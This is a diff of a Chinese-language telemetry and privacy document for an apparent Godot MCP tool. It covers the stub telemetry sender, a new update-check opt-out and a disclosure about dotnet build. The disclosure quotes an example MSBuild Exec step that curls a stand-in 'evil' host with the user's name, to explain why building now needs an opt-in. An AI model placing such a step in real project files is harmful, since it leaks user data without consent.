@@ -83,8 +83,11 @@ endpoint 空 → record 检测到后立即 return，**不入队、不调度、�
 
 ### 队列与发送
 
+> [!warning] Stage 0 stub（2026-08-06 审查 P2 修复订正）
+> 当前实现处于 Stage 0：`sendBatch()` 是 stub（`src/telemetry/collector.ts:45-46` 空函数体），**永不调用**。即使设 `GODOT_MCP_TELEMETRY_ENDPOINT`，也不会发送任何数据。下列"发送"行为描述是 Stage 1 接入后的契约，当前仅为预埋设计。
+
 - **队列**：进程内数组，上限 `QUEUE_MAXSIZE = 500`，满时丢新事件（保业务关键旧事件）
-- **发送**：`setTimeout(flush, 0)` 异步 fire-and-forget，批量 POST 到 `GODOT_MCP_TELEMETRY_ENDPOINT`
+- **发送**（Stage 1 实现）：`setTimeout(flush, 0)` 异步 fire-and-forget，批量 POST 到 `GODOT_MCP_TELEMETRY_ENDPOINT`。Stage 1 实现须遵 `collector.ts:44` 注释预埋的安全契约：`trustEnv=false`（防 HTTP_PROXY 拦截重定向）+ `try/catch`（永不传播故障）
 - **失败传播**：消费侧任何 throw 都被吞掉（`catch {}`），**绝不会让遥测故障影响 MCP 业务**
 - **不持久化**：队列纯内存，进程退出丢弃（fire-and-forget 语义，daemon-less）
 
@@ -116,23 +119,15 @@ import('./core/update-checker.js')
 - **发送的数据**：仅 HTTPS GET 请求 npm registry（标准 npm registry GET，不附 body、不附 install UUID、不附任何自定义 header）。npm registry 服务端会记录请求 IP / UA（fetch 默认 User-Agent），这些由 npmjs.org 服务端策略控制，**本仓库不可控**
 - **失败静默**：网络失败 / 超时 / 解析失败均 `catch {}` 吞掉，不影响 MCP 启动
 
-### 当前**无** env 门控（诚实声明）
+### env 门控（2026-08-06 审查 P3 修复）
 
-> 截至本文档撰写时（commit 19a35ab + Task 5 docs），**`update-checker.ts` 没有任何环境变量门控**。
-> 已用 `grep -r GODOT_MCP_UPDATE_CHECK src/` 全仓库搜索确认：**零匹配**。
-> 也就是说：
+> 截至 v0.25.7+（2026-08-06 审查 P3 修复），**`update-checker.ts` 已支持 env 门控**：
+> 设 `GODOT_MCP_UPDATE_CHECK=false` 即可关闭启动时的 npm registry 查询（对齐 telemetry opt-in 哲学）。
 >
-> - 没有 `GODOT_MCP_UPDATE_CHECK=false` 之类的 opt-out 开关
-> - 每次 MCP server 启动都会查 npm registry（24h 缓存命中则不发网络请求，但仍读本地缓存文件）
-> - 这与「默认零外传」的遥测声明是**冲突的硬伤**——遥测默认关闭，但 update-checker 启动即外传
+> - **默认行为（未设 env）**：启动时被动查 npm registry（24h 缓存兜底，首次必传一次）
+> - **设 `GODOT_MCP_UPDATE_CHECK=false`**：完全跳过启动外传，`checkForUpdateCached` 直接返当前版本（不 fetch、不读缓存）。注：`self_update` 的 `check` action（用户主动查询）不受此 env 门控——属用户显式行为
 >
-> **本 PR（Task 5）只做文档披露，不改 update-checker 行为**。补 env 门控（如 `GODOT_MCP_UPDATE_CHECK=false`）属于未来 PR 的范围。在此期间，若你需要完全离线运行：
->
-> 1. **防火墙阻断** `registry.npmjs.org`（最彻底，但也阻断 npm install）
-> 2. **预置缓存**：手动写 `~/.godot-mcp/update-cache.json` 为 `{ "lastCheck": <未来时间戳>, "latest": "<当前版本>" }`，则 24h 内 `readCache` 命中、跳过 fetch（注意 `lastCheck` 是 `Date.now()` 毫秒时间戳）
-> 3. **设代理**：通过 HTTPS proxy 拦截或重写该请求
->
-> 以上均为 workaround，**非官方支持的 opt-out**。未来 PR 补 env 门控后会同步更新本段。
+> 此前状态（已修复）：v0.25.0~v0.25.6 期间无 env 门控，与「默认零外传」声明冲突。原 workaround（防火墙/预置缓存/代理）仍可用，但现已非必需。
 
 ### 代理环境变量遵守
 
@@ -158,6 +153,18 @@ import('./core/update-checker.js')
 - **阶段 0（当前）**：骨架 + 默认关闭 + endpoint 空 = 零外传。仅本地积累队列（仅内存）。
 - **阶段 1（未来 PR）**：接入收集服务（自建 PostHog / Plausible / 自托管），定默认 endpoint，补隐私 policy 链接。
 - **阶段 2（未来 PR）**：聚合看板（工具使用频次 / 错误率 Top N / 版本分布），仅项目维护者可见。
-- **update-checker env 门控（独立 PR）**：补 `GODOT_MCP_UPDATE_CHECK=false` opt-out，让默认零外传声明对所有外传点都成立。
+- **update-checker env 门控（独立 PR）**：~~补 `GODOT_MCP_UPDATE_CHECK=false` opt-out，让默认零外传声明对所有外传点都成立。~~ ✅ **已落地**（2026-08-06 审查 P3 修复，见上「env 门控」段）
+
+---
+
+## 非 telemetry 外传点：C# dotnet build MSBuild Target（2026-08-06 审查 P2 披露）
+
+> 此项**不属于 telemetry 子系统**，但属可控外传面，一并列出供用户知情。
+
+`edit_script` 编辑 `.cs` 文件后会调 `dotnet build --no-restore` 做编译验证（`src/tools/script.ts:csharpValidateAndRevert`）。`--no-restore` 阻止 NuGet 包还原，但**不阻止** `.csproj` 内 MSBuild `<Target BeforeTargets="BeforeBuild">` 预构建步骤执行——后者可含 `<Exec Command="curl http://evil/$(UserName)"/>` 等网络请求，触发外传。
+
+**控制方式**（2026-08-06 审查 P1 修复）：`csharpValidateAndRevert` 现要求 `GODOT_MCP_PRIVILEGED_GROUPS=code-execution` opt-in 才走 dotnet build；未 opt-in 时 skip（不阻断编辑，但也不跑 build）。这与 `execute_gdscript` 的 action-gate 哲学对齐——任意代码执行面须显式授权。
+
+**用户的可控边界**：(1) 不设 `GODOT_MCP_PRIVILEGED_GROUPS=code-execution` 则 dotnet build 不跑（零外传风险）；(2) 设了 opt-in 后，外传面等同于手动运行 `dotnet build`（用户对自己项目的 .csproj 负责）。
 
 阶段 1+ 均会同步更新本文档与 CHANGELOG，并通过 `setup_project_rules` 写入 `.claude/rules/` 让 AI 在使用本工具时知晓当前阶段。
